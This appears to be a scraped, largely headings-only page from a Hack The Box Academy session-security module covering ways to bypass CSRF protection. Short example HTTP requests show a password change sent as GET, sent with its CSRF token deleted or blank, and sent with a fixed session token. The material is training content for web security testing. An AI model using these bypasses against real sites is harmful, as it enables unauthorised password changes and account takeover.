<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/153/section/1452
// Platform Version: V1
// Module ID: 153
// Module Name: Session Security
// Module Difficulty: Medium
// Section ID: 1452
// Section Title: Additional CSRF Protection Bypasses
// Page Title: Session Security
// Page Number: 11
-->

# Additional CSRF Protection Bypasses

**Module Name:** Session Security **Page Number:** 11

#### SESSION SECURITY

# Additional CSRF Protection Bypasses

## Null Value

## Random CSRF Token

## Use Another Session’s CSRF Token

## Request Method Tampering

``` http
POST /change_password
POST body:
new_password=pwned&confirm_new=pwned
```

``` http
GET /change_password?new_password=pwned&confirm_new=pwned
```

## Delete the CSRF token parameter or send a blank token

``` http
POST /change_password
POST body:
new_password=qwerty&csrf_token=9cfffd9e8e78bd68975e295d1b3d3331
```

``` http
POST /change_password
POST body:
new_password=qwerty
```

``` http
POST /change_password
POST body:
new_password=qwerty&csrf_token=
```

## Session Fixation > CSRF

``` http
POST /change_password
Cookie: CSRF-Token=fixed_token;
POST body:
new_password=pwned&CSRF-Token=fixed_token
```

## Anti-CSRF Protection via the Referrer Header

## Bypass the Regex

####